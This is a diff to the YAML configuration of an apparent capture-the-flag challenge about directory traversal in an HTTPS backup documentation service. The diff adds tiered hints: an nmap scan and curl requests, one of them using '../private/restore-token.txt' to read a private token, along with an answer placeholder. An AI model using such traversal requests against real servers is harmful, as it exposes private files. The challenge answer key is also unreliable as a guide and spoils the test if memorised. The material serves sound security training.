@@ -4,7 +4,7 @@ kind: flag-node-generator
 name: 'HTTPS: Directory Traversal Backups'
 description: TLS backup documentation portal with a vulnerable download path reaching
   private restore notes.
-hint_template: Use the TLS download endpoint before moving to {{NEXT_NODE_NAME}}.
+hint_template: Check how the document service confines requested file paths.
 runtime:
   type: docker-compose
   compose_file: docker-compose.yml
@@ -71,10 +71,23 @@ access_instructions:
     instructions: Record the flag recovered via traversal.
 hint_levels:
   low:
-  - Use the TLS download endpoint before moving to {{NEXT_NODE_NAME}}.
+  - Check how the document service confines requested file paths.
   medium:
-  - 'File/artifact: {{OUTPUT.File(path):basename}}'
+  - 'Service: Directory Traversal in HTTPS Backup Docs. Target: {{THIS_NODE_NAME}}; TCP port: {{OUTPUT.PortForward(host, port)}}.'
+  - |-
+    Check the assigned port:
+    ```bash
+    nmap -sT -sV -p {{OUTPUT.PortForward(host, port)}} {{THIS_NODE_NAME}}
+    ```
   high:
-  - Fetch a normal restore runbook
-  - Traverse to the restore token
-  - 'Record the restore note: Record the flag recovered via traversal.'
+  - 'Answer: {{OUTPUT.Flag(flag_id)}}'
+  - |-
+    Fetch a normal restore runbook:
+    ```bash
+    curl -k 'https://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/download?file=restore-runbook.txt'
+    ```
+  - |-
+    Traverse to the restore token:
+    ```bash
+    curl -k 'https://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/download?file=../private/restore-token.txt'
+    ```
